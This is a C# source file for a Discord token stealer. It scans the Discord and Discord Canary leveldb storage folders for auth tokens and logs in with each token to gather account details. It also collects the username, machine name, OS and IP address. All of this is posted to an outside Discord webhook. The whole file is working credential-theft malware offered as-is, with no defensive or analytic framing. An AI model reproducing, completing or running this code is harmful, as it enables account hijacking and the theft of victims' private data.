using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;
using DiscordTokenStealer.Discord;
using System.Text.RegularExpressions;
using static DiscordTokenStealer.IPInfo;

namespace DiscordTokenStealer
{
    public static class Program
    {
        private static async Task Main()
        {
            StringBuilder content = new StringBuilder($"Username: {Environment.UserName}{Environment.NewLine}").AppendLine($"Machine Name: {Environment.MachineName}").AppendLine($"Operating System: {Environment.OSVersion.Platform}");
            IPAddress? address = await GetIPAddress();
            if (address != null)
            {
                content.AppendLine($"IPAddress: {address}");
            }
            List<string> tokens = GetTokens();
            if (tokens.Any())
            {
                content.AppendLine("Tokens: ");
                using DiscordClient client = new DiscordClient();
                foreach (string token in tokens)
                {
                    content.AppendLine($"\t{token}");
                    DiscordUser? user = await client.Login(token);
                    if (user != null)
                    {
                        content.AppendLine($"\tSummary: {Environment.NewLine}{user.Summary}{Environment.NewLine}");
                    }
                }
            }
            using DiscordWebhook webhook = new DiscordWebhook("https://canary.discord.com/api/webhooks/{webhook.id}/{webhook.token}");
            await webhook.SendMessage(content.ToString());
        }

        private static readonly string DefaultDirectory = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb");
        
        private static readonly string CanaryDirectory = Path.Join(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary", "Local Storage", "leveldb");
        
        private static List<string> GetTokens()
        {
            List<string> tokens = ParseTokens(DefaultDirectory);
            tokens.AddRange(ParseTokens(CanaryDirectory));
            return tokens;
        }

        private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
        private static List<string> ParseTokens(string directory)
        {
            return (!Directory.Exists(directory) ? null : (from groups in Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups) where groups.Count >= 3 select string.Join('.', groups.Values.Skip(1))).ToList()) ?? new List<string>();
        }

        private static async Task<IPAddress?> GetIPAddress(bool preferlocal = false)
        {
            IPAddress? local = await GetLocalIPv4() ?? await GetLocalIPv6();
            if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
            {
                return local;
            }
            IPInformation? info = await GetIpInformation();
            if (info == null || !IPAddress.TryParse(info.IP, out IPAddress? address))
            {
                return local;
            }
            return preferlocal ? local : address;
        }
    }
}
